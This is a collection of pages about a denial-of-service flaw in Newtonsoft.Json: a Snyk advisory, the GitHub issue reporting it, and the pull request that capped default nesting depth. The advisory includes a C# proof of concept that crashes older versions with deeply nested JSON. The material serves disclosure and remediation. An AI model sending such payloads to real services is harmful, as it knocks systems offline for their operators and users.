=== Content from security.snyk.io_a9dbf0ad_20250111_034739.html ===
[![Homepage](/_nuxt/header-logo.Dk_X-iWD.svg)](/)

2. [Snyk Vulnerability Database](/vuln)
3. [NuGet](/vuln/nuget)
4. newtonsoft.json
# Insecure Defaults Affecting [newtonsoft.json](/package/nuget/newtonsoft.json) package, versions **[,13.0.1)**

---

### Severity

 Recommended 0.0high010

CVSS assessment made by Snyk's Security Team. [Learn more](/vuln/SNYK-DOTNET-NEWTONSOFTJSON-2774678#cvss)

### Threat Intelligence

Exploit Maturity

Snyk has a proof-of-concept or detailed explanation of how to exploit this vulnerability.

Proof of conceptEPSS

The probability is the direct output of the EPSS model, and conveys an overall sense of the threat of
exploitation in the wild. The percentile measures the EPSS probability relative to all known EPSS scores.
Note: This data is updated daily, relying on the latest available EPSS model version.
Check out the EPSS
[documentation](https://www.first.org/epss/articles/prob_percentile_bins)
for more details.

**0.25% (65th percentile)**
### Do your applications use this vulnerable package?

In a few clicks we can analyze your entire application and see what components are vulnerable in your application, and suggest you quick fixes.

[Test your applications](https://app.snyk.io/login?cta=sign-up&loc=banner&page=vuln-vuln)

* Snyk ID**SNYK-DOTNET-NEWTONSOFTJSON-2774678**
* published**24 Apr 2022**
* disclosed**24 Apr 2022**
* credit**Gil Mirmovitch**

[Report a new vulnerability](https://snyk.io/vulnerability-disclosure/) [Found a mistake?](https://support.snyk.io/s/contactsupport)
#### Introduced: 24 Apr 2022

[CVE-2024-21907  (opens in a new tab)](https://www.cve.org/CVERecord?id=CVE-2024-21907) Common Vulnerabilities and Exposures (CVE) are common identifiers for publicly known security vulnerabilities[CWE-755  (opens in a new tab)](https://cwe.mitre.org/data/definitions/755.html) Common Weakness Enumeration (CWE) is a category system for software weaknesses
## How to fix?

Upgrade `Newtonsoft.Json` to version 13.0.1 or higher.

## Overview

Affected versions of this package are vulnerable to Insecure Defaults due to improper handling of StackOverFlow exception (SOE) whenever nested expressions are being processed.

## PoC

```

using System;

using System.IO;
using System.Linq;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace JsonTests
{
    class Program
    {
        static void Main(string[] args)
        {
            //Create a string representation of a highly nested object (JSON serialized)
            int nRep = 24000;
            string json = string.Concat(Enumerable.Repeat("{a:", nRep)) + "1" +
                          string.Concat(Enumerable.Repeat("}", nRep));

            //Parse this object (Parsing works well - no exception is being thrown)
            var parsedJson = JObject.Parse(json);

            using (var ms = new MemoryStream())
            using (var sWriter = new StreamWriter(ms))
            using (var jWriter = new JsonTextWriter(sWriter))
            {
                //Trying to serialize the object will result in StackOverflowException !!!
                parsedJson.WriteTo(jWriter);
            }

            //ToString throws StackOverflowException as well  (ToString is very unefficient - even for smaller payloads, it will occupy a lot of CPU & Memory)
            //parsedJson.ToString();

            //JsonConvert.SerializeObject throws StackOverflowException as well
            //string a = JsonConvert.SerializeObject(parsedJson);

        }
    }
}

```
## References

* [GitHub Commit](https://github.com/JamesNK/Newtonsoft.Json/commit/7e77bbe1beccceac4fc7b174b53abfefac278b66)
* [GitHub Issue](https://github.com/JamesNK/Newtonsoft.Json/issues/2457)
* [GitHub PR](https://github.com/JamesNK/Newtonsoft.Json/pull/2462)
* [Security Advisory](https://alephsecurity.com/vulns/aleph-2018004)
* [Security Article](https://alephsecurity.com/2018/10/22/StackOverflowException/)
### CVSS Scores

version 3.1
### Snyk

7.5 high

* Attack Vector (AV)

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed “remotely exploitable” and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

  **Network**
* Attack Complexity (AC)

  Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success when attacking the vulnerable component.

  **Low**
* Privileges Required (PR)

  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to carry out an attack.

  **None**
* User Interaction (UI)

  The vulnerable system can be exploited without interaction from any user.

  **None**

* Scope (S)

  An exploited vulnerability can only affect resources managed by the same security authority. In this case, the vulnerable component and the impacted component are either the same, or both are managed by the same security authority.

  **Unchanged**

* Confidentiality (C)

  There is no loss of confidentiality within the impacted component.

  **None**
* Integrity (I)

  There is no loss of integrity within the impacted component.

  **None**
* Availability (A)

  There is a total loss of availability, resulting in the attacker being able to fully deny access to resources in the impacted component; this loss is either sustained (while the attacker continues to deliver the attack) or persistent (the condition persists even after the attack has completed). Alternatively, the attacker has the ability to deny some availability, but the loss of availability presents a direct, serious consequence to the impacted component (e.g., the attacker cannot disrupt existing connections, but can prevent new connections; the attacker can repeatedly exploit a vulnerability that, in each instance of a successful attack, leaks a only small amount of memory, but after repeated exploitation causes a service to become completely unavailable).

  **High**
### NVD

7.5 high
### Product

* [Snyk Open Source](https://snyk.io/product/open-source-security-management/)
* [Snyk Code](https://snyk.io/product/snyk-code/)
* [Snyk Container](https://snyk.io/product/container-vulnerability-management/)
* [Snyk Infrastructure as Code](https://snyk.io/product/infrastructure-as-code-security/)
* [Snyk AppRisk](https://snyk.io/product/snyk-apprisk/)
### Resources

* [Vulnerability DB](https://security.snyk.io/)
* [Documentation](https://docs.snyk.io/)
* [Disclosed Vulnerabilities](/disclosed-vulnerabilities)
* [Blog](https://snyk.io/blog/)
* [FAQs](https://support.snyk.io/)
### Company

* [About](https://snyk.io/about)
* [Jobs](https://snyk.io/careers/)
* Contact
* [Policies](https://snyk.io/policies/terms-of-service/)
* [Do Not Sell My Personal Information](https://preferences.snyk.io/dont_sell)
### Contact Us

* Support
* [Report a new vuln](https://snyk.io/vulnerability-disclosure)
* [Events](https://snyk.io/events)
### Find us online

### Track our development

[![DevSecOps Community Podcast](data:image/svg+xml;base64...)](https://www.devseccon.com/the-secure-developer-podcast/)

© 2025 Snyk Limited

Registered in England and Wales. Company number: 09677925

Registered address: Highlands House, Basingstoke Road, Spencers Wood, Reading, Berkshire, RG7 1NT.



=== Content from github.com_a9b4fa30_20250111_034737.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FJamesNK%2FNewtonsoft.Json%2Fissues%2F2457)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FJamesNK%2FNewtonsoft.Json%2Fissues%2F2457)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=JamesNK%2FNewtonsoft.Json)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[JamesNK](/JamesNK)
/
**[Newtonsoft.Json](/JamesNK/Newtonsoft.Json)**
Public

* [Notifications](/login?return_to=%2FJamesNK%2FNewtonsoft.Json) You must be signed in to change notification settings
* [Fork
  3.3k](/login?return_to=%2FJamesNK%2FNewtonsoft.Json)
* [Star
   10.9k](/login?return_to=%2FJamesNK%2FNewtonsoft.Json)

* [Code](/JamesNK/Newtonsoft.Json)
* [Issues
  708](/JamesNK/Newtonsoft.Json/issues)
* [Pull requests
  76](/JamesNK/Newtonsoft.Json/pulls)
* [Actions](/JamesNK/Newtonsoft.Json/actions)
* [Projects
  0](/JamesNK/Newtonsoft.Json/projects)
* [Security](/JamesNK/Newtonsoft.Json/security)
* [Insights](/JamesNK/Newtonsoft.Json/pulse)

Additional navigation options

* [Code](/JamesNK/Newtonsoft.Json)
* [Issues](/JamesNK/Newtonsoft.Json/issues)
* [Pull requests](/JamesNK/Newtonsoft.Json/pulls)
* [Actions](/JamesNK/Newtonsoft.Json/actions)
* [Projects](/JamesNK/Newtonsoft.Json/projects)
* [Security](/JamesNK/Newtonsoft.Json/security)
* [Insights](/JamesNK/Newtonsoft.Json/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2FJamesNK%2FNewtonsoft.Json%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2FJamesNK%2FNewtonsoft.Json%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# ALEPH-2018004 - DOS vulnerability #2457

Closed

[thomasvdb](/thomasvdb) opened this issue
Jan 19, 2021
· 3 comments
 · Fixed by [#2462](https://github.com/JamesNK/Newtonsoft.Json/pull/2462)

Closed

# [ALEPH-2018004 - DOS vulnerability](#top) #2457

[thomasvdb](/thomasvdb) opened this issue
Jan 19, 2021
· 3 comments
 · Fixed by [#2462](https://github.com/JamesNK/Newtonsoft.Json/pull/2462)

## Comments

[![@thomasvdb](https://avatars.githubusercontent.com/u/1577109?s=80&u=8202db27d1563c2cb76382f49612239fdae051d1&v=4)](/thomasvdb)

Copy link

### **[thomasvdb](/thomasvdb)** commented [Jan 19, 2021](#issue-788773605)

| We're using [BlackDuck](https://www.blackducksoftware.com) to scan our projects and recently Newtonsoft.Json was flagged as a medium security risk (BDSA-2018-5195) because of the following issue:  Newtonsoft.Json is vulnerable to denial-of-service (DoS) due to a stack overflow that can occur whenever nested objects are being processed. A remote attacker could cause a vulnerable application to crash by causing it to process a maliciously crafted JSON object.  The BDSA record points to this article which was created around 2018: <https://alephsecurity.com/vulns/aleph-2018004> I've been searching for more information about this issue but can't find anything useful.  Do you have any more information about this? The article states that the issue has been communicated. Has this been fixed or what's your opinion about this? |
| --- |
| The text was updated successfully, but these errors were encountered: |

 👍
8
 ymccready, joaopgrassi, attritionorg, Silurus, bpellens, lofcz, pseudoramble, and YellowPhil reacted with thumbs up emoji

All reactions

* 👍
  8 reactions

[![@Silurus](https://avatars.githubusercontent.com/u/19695435?s=80&v=4)](/Silurus)

Copy link

### **[Silurus](/Silurus)** commented [Jan 21, 2021](#issuecomment-764666140)

| [@thomasvdb](https://github.com/thomasvdb) I was fighting with the same problem and probably found a way how to mitigate it by setting the **MaxDepth** serializer setting to 64 (or any other value you expect for your nesting object level) <https://www.newtonsoft.com/json/help/html/MaxDepth.htm>  Instead of a stack overflow, you will get a JsonReaderException thrown by the Newtonsoft library.  [DoS solution](https://user-images.githubusercontent.com/19695435/105361655-f84a9d80-5c0a-11eb-99a7-535006fb8faf.PNG) |
| --- |

All reactions

Sorry, something went wrong.

[![@JamesNK](https://avatars.githubusercontent.com/u/303201?s=80&u=a4521438844aae7f844f8717a79a9858d6c805da&v=4)](/JamesNK)

Copy link

Owner

### **[JamesNK](/JamesNK)** commented [Jan 21, 2021](#issuecomment-764871369)

| Yes, MaxDepth setting is designed for this situation. |
| --- |

All reactions

Sorry, something went wrong.

[![@Silurus](https://avatars.githubusercontent.com/u/19695435?s=80&v=4)](/Silurus)

Copy link

### **[Silurus](/Silurus)** commented [Jan 22, 2021](#issuecomment-765335146)

| [@JamesNK](https://github.com/JamesNK) maybe it is worth to set the default MaxDepth value for the json library? Do you have such plans? I'm just worrying about other people who don't know about this vulnerability and they still might use the library to deserialize some generalized types like "object" |
| --- |

 👍
1
 vratojr reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[![@JamesNK](https://avatars.githubusercontent.com/u/303201?s=40&u=a4521438844aae7f844f8717a79a9858d6c805da&v=4)](/JamesNK)
[JamesNK](/JamesNK)
mentioned this issue
[Jan 31, 2021](#ref-pullrequest-797602520)

[Change JsonReader and JsonSerializer default max depth to 128
#2462](/JamesNK/Newtonsoft.Json/pull/2462)
 Merged

[![@JamesNK](https://avatars.githubusercontent.com/u/303201?s=40&u=a4521438844aae7f844f8717a79a9858d6c805da&v=4)](/JamesNK)
[JamesNK](/JamesNK)
closed this as [completed](/JamesNK/Newtonsoft.Json/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
in
[#2462](/JamesNK/Newtonsoft.Json/pull/2462)
[Jan 31, 2021](#event-4269869591)

[![@nspruit](https://avatars.githubusercontent.com/u/3593160?s=40&v=4)](/nspruit)
[nspruit](/nspruit)
mentioned this issue
[Apr 29, 2021](#ref-pullrequest-870791869)

[chore: Update Newtonsoft.Json to version 13.0.1
DarkLiKally/I18Next.Net#13](/DarkLiKally/I18Next.Net/pull/13)
 Merged

[![@nul800sebastiaan](https://avatars.githubusercontent.com/u/304656?s=40&v=4)](/nul800sebastiaan)
[nul800sebastiaan](/nul800sebastiaan)
mentioned this issue
[Apr 26, 2022](#ref-issue-1195624991)

[Remove upper constraint of 12.99 for Newtonsoft.Json dependency for UmbracoCms.Core
umbraco/Umbraco-CMS#12235](/umbraco/Umbraco-CMS/issues/12235)

Closed

[jefflill](/jefflill)
added a commit
to nforgeio/neonKUBE
that referenced
this issue
[Jun 22, 2022](#ref-commit-2fa1fb2)
[![@jefflill](https://avatars.githubusercontent.com/u/4908431?s=40&u=9b2c9ae7f31861fd319d37609861ad662a154fed&v=4)](/jefflill)

`[Mitigate Newtonsoft DOS attacks:](/nforgeio/neonKUBE/commit/2fa1fb2b3c5c98b8b3df69bfc7e3faae9d07a91a "Mitigate Newtonsoft DOS attacks:

https://github.com/JamesNK/Newtonsoft.Json/issues/2457")`
…

`[2fa1fb2](/nforgeio/neonKUBE/commit/2fa1fb2b3c5c98b8b3df69bfc7e3faae9d07a91a)`

```
[JamesNK/Newtonsoft.Json#2457](https://github.com/JamesNK/Newtonsoft.Json/issues/2457)
```

[![@ericoporto](https://avatars.githubusercontent.com/u/2244442?s=40&v=4)](/ericoporto)
[ericoporto](/ericoporto)
mentioned this issue
[Jun 23, 2022](#ref-pullrequest-1280415990)

[Bump Newtonsoft.Json from 10.0.3 to 13.0.1 in /Editor/AGS.Editor
adventuregamestudio/ags#1701](/adventuregamestudio/ags/pull/1701)
 Closed

[![@ankitC](https://avatars.githubusercontent.com/u/3431803?s=40&v=4)](/ankitC)
[ankitC](/ankitC)
mentioned this issue
[Jul 12, 2022](#ref-issue-1301580759)

[Potential breaking change: Upgrade to exclusively use Newtonsoft.Json >= 13.0.1
microsoft/bond#1156](/microsoft/bond/issues/1156)

Closed

[![@pvanbuijtene](https://avatars.githubusercontent.com/u/7116354?s=40&v=4)](/pvanbuijtene)
[pvanbuijtene](/pvanbuijtene)
mentioned this issue
[Aug 3, 2022](#ref-pullrequest-1280834860)

[Bump Newtonsoft.Json from 11.0.2 to 13.0.1
EventStore/EventStore#3507](/EventStore/EventStore/pull/3507)
 Merged

[![@ytang1-godaddy](https://avatars.githubusercontent.com/u/72579004?s=40&v=4)](/ytang1-godaddy)
[ytang1-godaddy](/ytang1-godaddy)
mentioned this issue
[Feb 6, 2023](#ref-issue-1573452626)

[Cx46691637-14e8 @ Nuget-Newtonsoft.Json-9.0.1
ytang1-godaddy/aws-cdk-examples#9](/ytang1-godaddy/aws-cdk-examples/issues/9)

Open

[![@vitorrubio](https://avatars.githubusercontent.com/u/5557238?s=40&v=4)](/vitorrubio)
[vitorrubio](/vitorrubio)
mentioned this issue
[Feb 23, 2023](#ref-issue-1596150252)

[consider updating newtonsoft Json.NET to Version 13.0.2
DalSoft/DalSoft.RestClient#109](/DalSoft/DalSoft.RestClient/issues/109)

Closed

[![@elgonzo](https://avatars.githubusercontent.com/u/6129198?s=40&v=4)](/elgonzo)
[elgonzo](/elgonzo)
mentioned this issue
[Jun 25, 2023](#ref-issue-1773179721)

[Why the JsonSerializerProxy's override PopulateInternal method doesn't call the SetupReader method like its base one
#2868](/JamesNK/Newtonsoft.Json/issues/2868)

Open

[![@Yannike](https://avatars.githubusercontent.com/u/6811819?s=40&v=4)](/Yannike)
[Yannike](/Yannike)
mentioned this issue
[Jul 17, 2023](#ref-pullrequest-1807098659)

[Upgrade packages that have a dependence to a vulnerable version of NewtonSoft.Json
DotSpatial/DotSpatial#1517](/DotSpatial/DotSpatial/pull/1517)
 Open

[![@margohpolo](https://avatars.githubusercontent.com/u/19885151?s=40&v=4)](/margohpolo)
[margohpolo](/margohpolo)
mentioned this issue
[Jan 23, 2024](#ref-pullrequest-2096120282)

[upgrade NewtonsoftJson to v13 (vulnerability in v12)
ardalis/SolidSample#11](/ardalis/SolidSample/pull/11)
 Merged

[![@apeter48](https://avatars.githubusercontent.com/u/57506032?s=40&v=4)](/apeter48)
[apeter48](/apeter48)
mentioned this issue
[Jun 6, 2024](#ref-issue-2338433031)

[Critical and high security alerts
cristianoag/microsoft-teams-apps-company-communicator#81](/cristianoag/microsoft-teams-apps-company-communicator/issues/81)

Open

[![@06luki06](https://avatars.githubusercontent.com/u/95306265?s=40&v=4)](/06luki06)
[06luki06](/06luki06)
mentioned this issue
[Nov 19, 2024](#ref-issue-2672060385)

[Dependency Check
JamesNK/Newtonsoft.Json.Bson#46](/JamesNK/Newtonsoft.Json.Bson/issues/46)

Closed

[![@bt-ndollimount](https://avatars.githubusercontent.com/u/164526416?s=40&v=4)](/bt-ndollimount)
[bt-ndollimount](/bt-ndollimount)
mentioned this issue
[Nov 26, 2024](#ref-issue-2660434646)

[Vulnerabilities found in dbatools.library 2024.4.12
dataplat/dbatools.library#14](/dataplat/dbatools.library/issues/14)

Open

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2FJamesNK%2FNewtonsoft.Json%2Fissues%2F2457)

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

Successfully merging a pull request may close this issue.

 [Change JsonReader and JsonSerializer default max depth to 128](/JamesNK/Newtonsoft.Json/pull/2462)
 [JamesNK/Newtonsoft.Json](/JamesNK/Newtonsoft.Json)

3 participants

[![@JamesNK](https://avatars.githubusercontent.com/u/303201?s=52&v=4)](/JamesNK) [![@thomasvdb](https://avatars.githubusercontent.com/u/1577109?s=52&v=4)](/thomasvdb) [![@Silurus](https://avatars.githubusercontent.com/u/19695435?s=52&v=4)](/Silurus)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_54d5f718_20250111_034738.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FJamesNK%2FNewtonsoft.Json%2Fpull%2F2462)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FJamesNK%2FNewtonsoft.Json%2Fpull%2F2462)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=JamesNK%2FNewtonsoft.Json)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[JamesNK](/JamesNK)
/
**[Newtonsoft.Json](/JamesNK/Newtonsoft.Json)**
Public

* [Notifications](/login?return_to=%2FJamesNK%2FNewtonsoft.Json) You must be signed in to change notification settings
* [Fork
  3.3k](/login?return_to=%2FJamesNK%2FNewtonsoft.Json)
* [Star
   10.9k](/login?return_to=%2FJamesNK%2FNewtonsoft.Json)

* [Code](/JamesNK/Newtonsoft.Json)
* [Issues
  708](/JamesNK/Newtonsoft.Json/issues)
* [Pull requests
  76](/JamesNK/Newtonsoft.Json/pulls)
* [Actions](/JamesNK/Newtonsoft.Json/actions)
* [Projects
  0](/JamesNK/Newtonsoft.Json/projects)
* [Security](/JamesNK/Newtonsoft.Json/security)
* [Insights](/JamesNK/Newtonsoft.Json/pulse)

Additional navigation options

* [Code](/JamesNK/Newtonsoft.Json)
* [Issues](/JamesNK/Newtonsoft.Json/issues)
* [Pull requests](/JamesNK/Newtonsoft.Json/pulls)
* [Actions](/JamesNK/Newtonsoft.Json/actions)
* [Projects](/JamesNK/Newtonsoft.Json/projects)
* [Security](/JamesNK/Newtonsoft.Json/security)
* [Insights](/JamesNK/Newtonsoft.Json/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2FJamesNK%2FNewtonsoft.Json%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2FJamesNK%2FNewtonsoft.Json%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Change JsonReader and JsonSerializer default max depth to 128 #2462

 Merged

[JamesNK](/JamesNK)
merged 2 commits into
[master](/JamesNK/Newtonsoft.Json/tree/master "JamesNK/Newtonsoft.Json:master")
from
[jamesnk/defaultmaxdepth](/JamesNK/Newtonsoft.Json/tree/jamesnk/defaultmaxdepth "JamesNK/Newtonsoft.Json:jamesnk/defaultmaxdepth")

Jan 31, 2021

 Merged

# [Change JsonReader and JsonSerializer default max depth to 128](#top) #2462

[JamesNK](/JamesNK)
merged 2 commits into
[master](/JamesNK/Newtonsoft.Json/tree/master "JamesNK/Newtonsoft.Json:master")
from
[jamesnk/defaultmaxdepth](/JamesNK/Newtonsoft.Json/tree/jamesnk/defaultmaxdepth "JamesNK/Newtonsoft.Json:jamesnk/defaultmaxdepth")

Jan 31, 2021

[Conversation
0](/JamesNK/Newtonsoft.Json/pull/2462)
[Commits
2](/JamesNK/Newtonsoft.Json/pull/2462/commits)
[Checks
0](/JamesNK/Newtonsoft.Json/pull/2462/checks)
[Files changed](/JamesNK/Newtonsoft.Json/pull/2462/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![JamesNK](https://avatars.githubusercontent.com/u/303201?s=60&v=4)](/JamesNK)

Copy link

Owner

### @JamesNK **[JamesNK](/JamesNK)** commented [Jan 31, 2021](#issue-797602520)

Fixes [#2459](https://github.com/JamesNK/Newtonsoft.Json/issues/2459)

Fixes [#2457](https://github.com/JamesNK/Newtonsoft.Json/issues/2457)

Sorry, something went wrong.

All reactions

 [JamesNK](/JamesNK)
added 2 commits
[January 31, 2021 15:41](#commits-pushed-9007ff7)

[![@JamesNK](https://avatars.githubusercontent.com/u/303201?s=40&v=4)](/JamesNK)

`[Change default max depth to 128](/JamesNK/Newtonsoft.Json/pull/2462/commits/9007ff7e63dd67f20a0db6d2e5560792580250f5 "Change default max depth to 128")`

`[9007ff7](/JamesNK/Newtonsoft.Json/pull/2462/commits/9007ff7e63dd67f20a0db6d2e5560792580250f5)`

[![@JamesNK](https://avatars.githubusercontent.com/u/303201?s=40&v=4)](/JamesNK)

`[Clean up](/JamesNK/Newtonsoft.Json/pull/2462/commits/810bff495d977ef8ad1b590afbff816bcc19c978 "Clean up")`

`[810bff4](/JamesNK/Newtonsoft.Json/pull/2462/commits/810bff495d977ef8ad1b590afbff816bcc19c978)`

[![@JamesNK](https://avatars.githubusercontent.com/u/303201?s=40&u=a4521438844aae7f844f8717a79a9858d6c805da&v=4)](/JamesNK)
[JamesNK](/JamesNK)
changed the title
~~Change default max depth to 128~~
Change JsonReader and JsonSerializer default max depth to 128
[Jan 31, 2021](#event-4269866981)

[![@JamesNK](https://avatars.githubusercontent.com/u/303201?s=40&u=a4521438844aae7f844f8717a79a9858d6c805da&v=4)](/JamesNK)
[JamesNK](/JamesNK)
merged commit [`7e77bbe`](/JamesNK/Newtonsoft.Json/commit/7e77bbe1beccceac4fc7b174b53abfefac278b66)
into
master

[Jan 31, 2021](https://github.com/JamesNK/Newtonsoft.Json/pull/2462#event-4269869589)

